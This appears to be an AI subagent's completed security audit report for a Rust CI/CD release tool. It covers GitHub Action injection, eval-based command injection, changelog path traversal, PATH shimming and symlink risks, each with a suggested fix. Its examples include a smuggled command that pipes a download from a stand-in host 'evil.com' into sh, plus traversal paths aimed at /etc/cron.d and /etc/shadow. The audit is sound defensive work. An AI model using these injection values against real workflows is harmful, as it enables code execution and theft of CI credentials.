@@ -1,0 +1,188 @@
+<task-notification>
+<task-id>a5c33201e0996846e</task-id>
+<tool-use-id>toolu_01UrgXfs6V7Uga5cr8d1rJU2</tool-use-id>
+<output-file>/private/tmp/claude-501/-Users-gabe-Projects-callisto/a15bbbf7-aba0-415d-bfdc-c773ea65cfc7/tasks/a5c33201e0996846e.output</output-file>
+<status>completed</status>
+<summary>Agent "Audit: security, injection, and supply chain risks" finished</summary>
+<note>A task-notification fires each time this agent stops with no live background children of its own. The user can send it another message and resume it, so the same task-id may notify more than once.</note>
+<result>I now have everything I need. Here is the full security audit.
+
+---
+
+## Security Audit: Callisto CI/CD Tool
+
+All ten requested categories were investigated. Findings are ordered by severity within each category. Items already confirmed as `fixed` in FINDINGS.md are not re-reported.
+
+---
+
+### [High] GitHub Action Expression Injection in `setup-callisto` — `${{ inputs.version }}` in `run:` block
+
+- **Status**: CONFIRMED
+- **Location**: `.github/actions/setup-callisto/action.yml:36`
+- **Classification**: GitHub Action YAML Injection (Category 6)
+- **Root Cause**: `TAG_NAME="${{ inputs.version || 'latest' }}"` is inside a `run: |` block. GitHub Actions processes `${{ }}` expressions server-side by string-substitution into the shell script before execution. If `inputs.version` contains shell metacharacters (e.g., `'; curl evil.com/payload|sh; echo '`), the runner executes the injected command with full CI permissions. The current internal callers (`callisto-release.yml`, `callisto-action/action.yml`, `callisto-validate/action.yml`) all omit the `with: version:` key and receive the default `'latest'`, so the internal usage is safe today. However the vulnerability is latent in the action's interface.
+- **Failing Scenario**: An external consumer of the composite action, or a maintainer running `workflow_dispatch` who passes a crafted version string through a calling workflow that reads from user-supplied input, e.g., `version: ${{ github.event.inputs.callisto_version }}`. Attacker: external contributor if the calling workflow surfaces this input from a PR trigger; insider otherwise.
+- **Correct fix pattern**: Move the interpolation to an `env:` key (`TAG_NAME: ${{ inputs.version || 'latest' }}`) and reference `$TAG_NAME` in the script body. All other `${{ }}` references in `run:` blocks in this repo are already using the env-var pattern correctly; this is the sole exception.
+- **Severity**: High (currently unexploitable internally, but the pattern is wrong and a one-line PR change to the calling workflow would make it critical)
+
+---
+
+### [High] `eval "$INPUT_VERSION_COMMAND"` and `eval "$INPUT_PUBLISH"` — Command Injection by Design
+
+- **Status**: CONFIRMED
+- **Location**: `.github/actions/callisto-action/action.yml:103` (`eval "$INPUT_VERSION_COMMAND"`), `:157` (`eval "$INPUT_PUBLISH"`)
+- **Classification**: Command Injection (Category 1, Category 6)
+- **Root Cause**: Both input values are correctly moved to env vars before the `run:` block (avoiding YAML expression injection). But `eval` then executes those env var values as shell code. Any caller who populates `inputs.version_command` or `inputs.publish` from user-controlled content achieves arbitrary code execution in the runner's shell. The release workflow hardcodes `publish: "true"`, so the live internal path is `eval "true"` (a shell no-op), and `version_command` defaults to `callisto version`. The code is currently safe for internal usage.
+- **Failing Scenario**: A consuming workflow that sources `inputs.publish` from a PR title, branch name, or workflow-dispatch input; or a team member with workflow-edit permissions setting `version_command: "malicious; exfil"`. Attacker: insider (for `version_command`), external if calling workflow surfaces these inputs from untrusted content.
+- **Impact**: Full RCE in the CI runner with its token permissions (`contents: write`, `pull-requests: write`, `id-token: write` are all granted in `callisto-release.yml`).
+- **Verification**: Trace `eval "$INPUT_VERSION_COMMAND"` at line 103 — the variable is set directly from `${{ inputs.version_command }}` via the `env:` block at line 62; no sanitization is applied.
+
+---
+
+### [High] `$token_flag` Used Unquoted — CARGO_REGISTRY_TOKEN Word-Splitting and Potential Exposure
+
+- **Status**: CONFIRMED
+- **Location**: `.github/actions/callisto-action/action.yml:169-177`
+- **Classification**: Credential/Secret Exposure (Category 4), Subprocess Argument Ordering (Category 6)
+- **Root Cause**:
+  ```bash
+  if [[ -n "$CARGO_REGISTRY_TOKEN" ]]; then
+    token_flag="--token $CARGO_REGISTRY_TOKEN"
+  fi
+  output=$(cargo publish -p "$crate" $token_flag --no-verify --allow-dirty 2&gt;&amp;1 || true)
+  ```
+  `$token_flag` is unquoted. Two problems: (1) if `CARGO_REGISTRY_TOKEN` contains whitespace (e.g., a malformed secret), the token is word-split into separate shell tokens, producing incorrect cargo arguments and potentially passing the token fragment as a positional argument or flag value to cargo. (2) The complete command including the token value appears in the process's `$output` capture via `2&gt;&amp;1`. GitHub Actions masks registered secret values in step logs, but if cargo's own error output echoes back the command line (some versions do under certain failure modes), the token could appear in a non-masked form if the masking engine doesn't recognize the reconstructed string.
+- **Failing Scenario**: `CARGO_REGISTRY_TOKEN="real-token foo"` (space in value — possible if a secret was miscopied). `$token_flag` becomes three tokens: `--token`, `real-token`, `foo`; cargo receives `foo` as an unexpected positional argument.
+- **Fix**: Use an array: `token_args=()` and `token_args=(--token "$CARGO_REGISTRY_TOKEN")`, then `cargo publish -p "$crate" "${token_args[@]}"`.
+
+---
+
+### [Medium] Path Traversal via `changelog` Field in `callisto.toml` — No Sanitization of Configured Path
+
+- **Status**: CONFIRMED
+- **Location**: `crates/callisto-graph/src/config/resolve.rs:293`, `crates/callisto-graph/src/apply.rs:118-128`, `crates/callisto-changelog/src/write.rs:26`
+- **Classification**: Path Traversal (Category 2)
+- **Root Cause**: The `changelog` field in `callisto.toml`'s `[[package]]` or `[[package-set]]` sections is deserialized as a raw string and converted to a `PathBuf` without any validation:
+  ```rust
+  let changelog = raw_pkg.changelog.as_deref().map(PathBuf::from);  // resolve.rs:293
+  ```
+  In `write.rs`:
+  ```rust
+  let full_path = root.join(changelog_path);  // no canonicalization, no prefix check
+  fs::create_dir_all(parent)?;               // creates arbitrary directory trees
+  ```
+  In Rust, `Path::join` with an absolute component (`/etc/cron.d/evil`) replaces the root entirely. With a relative traversal (`../../etc/shadow`), it joins literally. Neither is rejected. Subsequently `create_dir_all` creates parent directories along the traversal path, and `atomic_write` writes the changelog content there.
+- **Failing Scenario**: A `callisto.toml` containing `changelog = "/etc/cron.d/evil"` causes `callisto version` to write a Markdown file at that path (with `create_dir_all` creating any missing parents). Attacker needs write access to `callisto.toml` — an insider, or an external contributor whose PR is merged without careful review of the config file.
+- **Impact**: Arbitrary file write anywhere the CI runner has write permission, with attacker-controlled content (the changelog is populated from changeset summaries, which are also user-controlled).
+- **Verification Strategy**: Add a test asserting that a `changelog_path` of `"../../../tmp/evil.md"` is rejected before `apply_version_plan` completes. Currently no such validation exists anywhere in the call chain.
+
+---
+
+### [Medium] `write_changeset` Does Not Reject Package Names Containing Newlines — Frontmatter Injection
+
+- **Status**: PLAUSIBLE (not exploitable through the current public API, but `write_changeset` is a library function)
+- **Location**: `crates/callisto-format/src/changeset/mod.rs:224-234`
+- **Classification**: TOML/Format Injection (Category 3)
+- **Root Cause**: `write_changeset` only rejects entry names that are empty or contain a literal `"`. A name containing `\n---\ncargo/injected` would produce:
+  ```
+  ---
+  foo
+  ---
+  cargo/injected: patch
+  ---
+  ```
+  The parser (`parse_changeset`) performs a two-pass scan for frontmatter boundaries and would interpret the second `---` as the frontmatter close, treating the injected line as a real entry.
+- **Not Currently Exploitable**: `PackageId::parse` (the gatekeeper for all names entering the system via `callisto add`) would reject a name containing `\n`. Names from `ws.graph.packages()` (the interactive path) come from manifest files, which also cannot contain newline-embedded package names.
+- **Failing Scenario**: A direct call to `write_changeset` with `Entry { name: "foo\n---\ncargo/evil".to_string(), severity: Severity::Patch }` produces a parseable changeset that claims two packages were bumped. Attacker: any code that constructs a `Changeset` directly and bypasses `PackageId::parse`.
+- **Fix**: Add `if entry.name.contains('\n') { return Err(WriteError::NameContainsNewline { ... }) }` alongside the existing empty-name and contains-quote checks.
+
+---
+
+### [Medium] No Verification That `cargo`, `npm`, `twine` Come From Expected Paths — PATH Manipulation
+
+- **Status**: CONFIRMED
+- **Location**: `crates/callisto-graph/src/commands/publish_client.rs:61,104,144`
+- **Classification**: Dependency Trust / Subprocess Security (Category 7)
+- **Root Cause**: All three ecosystem publisher calls resolve binaries by name through the ambient `PATH`:
+  ```rust
+  self.run("cargo", &amp;["publish", "-p", package.name(), "--locked"])?;
+  self.run("npm", &amp;["publish", "--workspace", ...]);
+  self.run("twine", &amp;["upload", "--skip-existing", &amp;pattern])?;
+  ```
+  If a compromised build step earlier in the CI pipeline prepends a malicious directory to `PATH`, or if `node_modules/.bin/` contains a shimmed `twine` or `cargo`, those shims execute with full runner permissions and can exfiltrate credentials, produce misleading exit codes, or silently publish to a different registry.
+- **Attacker**: Supply chain (compromised dependency), or insider who adds a malicious setup step to the workflow. This is inherent to shell-out architecture, but worth documenting as the blast radius includes registry token exposure.
+- **Mitigation options**: Pin binary paths via `which cargo` at startup and compare against known install locations, or use `cargo`'s full canonical path (e.g., `$CARGO_HOME/bin/cargo`). No current mitigations exist.
+
+---
+
+### [Medium] Symlink Attack on Workspace Directories via `NamedTempFile::new_in`
+
+- **Status**: PLAUSIBLE
+- **Location**: `crates/callisto-manifests/src/atomic.rs:44`
+- **Classification**: Symlink Attack (Category 5)
+- **Root Cause**: `NamedTempFile::new_in(parent)` follows symlinks when selecting the temp file's directory. `persist(path)` then calls `std::fs::rename` which on Linux replaces the destination path itself (does NOT follow a symlink at the destination), so the final rename is safe. But the temp file creation is not: if an attacker can replace `.changeset/` with a symlink to `/etc/cron.d/` before `callisto add` runs, `NamedTempFile::new_in(".changeset/")` creates the temp file inside `/etc/cron.d/`. The `persist` call then `rename`s that temp file to `/etc/cron.d/&lt;slug&gt;.md`. The changeset content is user-controlled markdown text, not executable, so the direct impact is limited — but it writes an attacker-controlled file to an attacker-chosen directory.
+- **Attacker**: Must have write access to the workspace root to replace `.changeset/` with a symlink. Insider or a compromised CI step that runs before `callisto add`.
+- **Impact**: Write arbitrary content (bounded by changeset format) to a symlink-target directory. In most CI environments, the runner doesn't have write access to sensitive system directories, limiting the blast radius to within the checkout.
+
+---
+
+### [Low] `callisto status` Output Written Verbatim to `$GITHUB_STEP_SUMMARY` — Workflow Metadata Injection Surface
+
+- **Status**: CONFIRMED (no current exploitable path, but worth documenting)
+- **Location**: `.github/actions/callisto-validate/action.yml:40`
+- **Classification**: GitHub Action YAML Injection (Category 6)
+- **Root Cause**:
+  ```bash
+  callisto status &gt;&gt; $GITHUB_STEP_SUMMARY
+  ```
+  Package names and changeset summaries (both user-controlled strings from manifests and `.changeset/*.md` files) appear in `callisto status` output, which is appended to the GitHub Step Summary file. Modern GitHub Actions do not process inline workflow commands (`::set-env::`, `::add-path::`, etc.) from summary files — those were deprecated and replaced by `$GITHUB_ENV`/`$GITHUB_PATH` file-write protocol. So today this is not a command injection vector.
+- **Residual Risk**: If GitHub ever re-introduces inline command processing in summary files, this surface becomes exploitable by any contributor who can write a changeset with a crafted summary. Worth noting because the same output pattern (`callisto status`, `PR_BODY`) is echoed to stdout elsewhere in the action, where workflow commands ARE processed by the runner.
+- **Verification**: Confirmed by GitHub's own documentation that summary files do not process `::` commands as of the current runner version.
+
+---
+
+### [Low] `atomic_write` Creates Files with `0600` Permissions on Unix
+
+- **Status**: CONFIRMED
+- **Location**: `crates/callisto-manifests/src/atomic.rs:44`
+- **Classification**: File Permission Issues (Category 8)
+- **Root Cause**: `NamedTempFile::new_in(parent)` creates the temp file with mode `0600` (owner read-write, no group or world access) on Unix, which is the `tempfile` crate's unconditional default. `temp.persist(path)` calls `rename`, which preserves the `0600` mode. Changeset files written by `callisto add` end up `0600`. This means: (a) other users on the same machine cannot read `.changeset/*.md` without `sudo`, and (b) git's staging behavior is unaffected (git tracks content, not mode by default), but `git status --porcelain` and `cat .changeset/*.md` by another CI user would fail.
+- **Failing Scenario**: Multi-user development environment where `callisto add` is run by user A and the file must be readable by user B (e.g., a shared CI agent). Not a security escalation — this is actually more restrictive than needed, which is a usability concern in shared environments.
+- **Fix**: After `persist`, call `std::fs::set_permissions(path, Permissions::from_mode(0o644))` to match typical file conventions for source-controlled text files.
+
+---
+
+### [Low — Registry Confusion] PyPI Does Not Fall Back to npm; `Ecosystem::Pypi` Correctly Dispatches
+
+- **Status**: CONFIRMED NOT EXPLOITABLE (the reported bug does not exist in the current codebase)
+- **Location**: `crates/callisto-graph/src/commands/publish_client.rs:182-201`
+- **Classification**: Registry Confusion (Category 10)
+- **Investigation Result**: The task description flagged a reported bug where `kind = "pypi"` silently falls back to npm. Tracing `SubprocessRegistryClient::publish`: `Ecosystem::Pypi` matches the explicit `pypi_publish` arm; the catch-all `other =&gt; Err(RegistryError::Other(...))` returns an error rather than falling through to npm. The `is_published` method for PyPI returns `Ok(false)` unconditionally (by design — `twine --skip-existing` handles idempotency at upload time), which could be misread as "never pre-check," but this is documented and intentional. No silent fallback to npm exists.
+- **Remaining gap (design, not a bug)**: `is_published` returning `Ok(false)` for PyPI means `PublishOrchestrator` always attempts `pypi_publish` without a pre-check. If the dist file doesn't exist on disk (e.g., no `dist/` directory), `twine upload dist/&lt;glob&gt;` exits non-zero and `classify_twine_output` returns `Err(RegistryError::Other(...))`. This is the correct behavior but means PyPI publish failures are noisier than Cargo's (which catches "already exists" from the upload attempt itself). Not a security issue.
+
+---
+
+### Denial of Service Assessment
+
+- **Dependency graph recursion**: The cascade solver in `cascade.rs` uses an iterative worklist/fixpoint loop rather than recursion. No stack overflow risk was found in the paths I traced. The revwalk in `commits_since_with_pathspec` is bounded by git history length (unbounded in theory, but the fix for the full-history walk on unresolvable refs was already confirmed applied).
+- **Malformed `callisto.toml` causing OOM**: TOML is deserialized via `toml_edit` + `serde`. A pathologically large (but syntactically valid) `callisto.toml` with thousands of `[[package]]` entries would allocate proportionally. No size limit exists. Requires insider write access to commit such a file.
+- **Adversarial `Cargo.toml` deep workspace tree**: `walk.rs` walks manifest files discovered via `ignore::Walk`. A deeply nested workspace with symlink loops could cause an infinite walk, but `ignore::Walk` by default follows the `gitignore` semantics and would be bounded by the checked-out tree. The graph build itself is not recursive. No confirmed OOM vector.
+
+---
+
+## Attacker Model Summary
+
+| Finding | Required Attacker Position |
+| :--- | :--- |
+| `setup-callisto` expression injection | External if calling workflow passes user input to `version:`; insider otherwise |
+| `eval "$INPUT_PUBLISH/VERSION_COMMAND"` | Insider with workflow-edit access; external if caller workflow sources inputs from PR content |
+| `$token_flag` unquoted | Self-inflicted by maintainer (malformed secret), or supply chain |
+| Changelog path traversal | Insider or external contributor whose PR modifying `callisto.toml` is merged without config review |
+| `write_changeset` newline injection | Any caller bypassing `PackageId::parse` (not possible through the public CLI) |
+| PATH manipulation / binary shimming | Supply chain or insider with CI step injection |
+| Symlink attack on `.changeset/` | Insider or compromised prior CI step with workspace write access |
+| `atomic_write` 0600 permissions | N/A (usability concern, not a security attack vector) |
+
+The most actionable findings requiring code changes are: (1) move `${{ inputs.version }}` to an env var in `setup-callisto`, (2) fix the unquoted `$token_flag` array pattern, (3) add a `validate_changelog_path` guard in `resolve.rs` that rejects absolute paths and `..` components, and (4) add a `\n`-rejection check in `write_changeset`.</result>
+<usage><subagent_tokens>104365</subagent_tokens><tool_uses>29</tool_uses><duration_ms>432642</duration_ms></usage>
+</task-notification>
